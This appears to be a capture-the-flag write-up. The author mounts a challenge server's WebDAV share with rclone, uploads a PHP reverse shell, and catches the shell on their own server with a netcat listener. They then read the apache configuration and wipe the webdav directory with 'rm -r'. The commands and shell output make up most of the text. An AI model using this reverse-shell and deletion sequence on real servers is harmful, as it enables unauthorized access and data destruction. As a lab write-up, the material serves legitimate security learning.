# Operation Eradication

Starting off we 















Using `rclone` we can mount the whole /webdav/ directory into one of our own. <br/>
```sh
kali@kali rclone mount yeet:/webdav/ ./mounted_dir

kali@kali ls mounted_dir/
Accounting  HumanResources  Legal      Operations          Sales   remover.sh
Finance     IT              Marketing  ProductDevelopment  del.sh  rev_shell.php
```

Now I copied a reverse shell into the mounted directory and executed it with `cat`. <br/>
This opens a reverse shell on my Vserver on its public IP. <br/>
```sh
nc -lnvp 1234
listening on [any] 1234 ...


connect to [REDACTED] from (UNKNOWN) [34.123.224.68] 32070
Linux operation-eradication-266f1c7f2786d51f-8498b5d548-zbmvq 5.15.109+ #1 SMP Fri Jun 9 10:57:30 UTC 2023 x86_64 GNU/Linux
 17:22:35 up  4:18,  0 users,  load average: 0.44, 0.25, 0.20
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ export TERM=xterm
```

Seems like this gave me a reverse shell so I checked the apache configuration: <br/>
```sh
$ cat /etc/apache2/sites-available/*


-----------------------------
DocumentRoot /var/www/html
-----------------------------
```

Knowing the `DocumentRoot` we can take a look at this directory. <br/>
```sh
$ ls -R /var/www/
/var/www/:
html

/var/www/html:
index.php
webdav
```

Knowing that the challenge is to delete all data in webdav I just removed the whole directory: <br/>
```sh
$ rm -r webdav/ 
```



